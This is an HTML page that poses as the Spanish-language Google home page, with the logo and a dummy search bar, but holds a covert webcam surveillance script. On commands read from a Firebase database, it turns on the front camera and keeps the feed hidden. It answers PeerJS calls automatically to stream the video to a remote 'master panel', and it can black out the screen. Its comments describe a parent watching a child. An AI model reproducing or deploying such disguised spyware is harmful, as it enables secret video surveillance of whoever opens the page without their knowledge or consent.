<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    
    <style>
        body { margin: 0; font-family: arial, sans-serif; background: white; overflow: hidden; }
        #bloqueo { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: black; z-index: 9999; justify-content: center; align-items: center; 
        }
        .google-home { display: flex; flex-direction: column; align-items: center; padding-top: 100px; }
        .logo { width: 160px; margin-bottom: 20px; }
        .search-bar { width: 90%; max-width: 580px; border: 1px solid #dfe1e5; padding: 10px 20px; border-radius: 24px; font-size: 16px; outline: none; }
        
        /* Video de la cámara (se mantiene oculto para el niño) */
        #videoLocal {
            display: none; position: fixed; bottom: 10px; right: 10px; width: 80px; height: 110px;
            object-fit: cover; z-index: 5000; border: 2px solid white; border-radius: 8px;
        }
    </style>
</head>
<body>

    <div id="bloqueo">
        <h1 style="color:red; font-family: sans-serif;">⚠️ ACCESO RESTRINGIDO</h1>
    </div>

    <video id="videoLocal" autoplay playsinline muted></video>

    <div class="google-home">
        <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
        <input type="text" class="search-bar" placeholder="Buscar en Google o escribir URL">
        <p style="color:#70757a; font-size: 14px; margin-top: 20px;">Google ofrecido en: Español (Latinoamérica)</p>
    </div>

    <script>
        // 1. Configuración de tu Firebase
        const firebaseConfig = {
            databaseURL: "https://micontrol-30a70-default-rtdb.firebaseio.com/"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // 2. Configuración de la "Antena" (PeerJS)
        // Usamos un ID fijo para que el padre sepa a quién llamar
        const peer = new Peer('camara-nino-123'); 
        const videoLocal = document.getElementById('videoLocal');
        let streamLocal = null;

        // 3. Escuchar el bloqueo (SI/NO)
        db.ref('bloqueo').on('value', (snap) => {
            document.getElementById('bloqueo').style.display = (snap.val() === "SI") ? "flex" : "none";
        });

        // 4. Escuchar orden de Cámara
        db.ref('comando_camara').on('value', (snap) => {
            if (snap.val() === "ABRIR") {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                .then((stream) => {
                    streamLocal = stream;
                    videoLocal.srcObject = stream;
                    // El video se queda "encendido" internamente listo para transmitir
                    console.log("Cámara lista para transmitir");
                })
                .catch((err) => {
                    console.error("Error al acceder a cámara: ", err);
                });
            }
        });

        // 5. Contestar la llamada del Padre automáticamente
        peer.on('call', (call) => {
            if (streamLocal) {
                call.answer(streamLocal); // Envía el video al padre
                console.log("Transmitiendo video al panel maestro...");
            }
        });

        peer.on('open', (id) => {
            console.log('Antena lista con ID: ' + id);
        });
    </script>
</body>
</html>
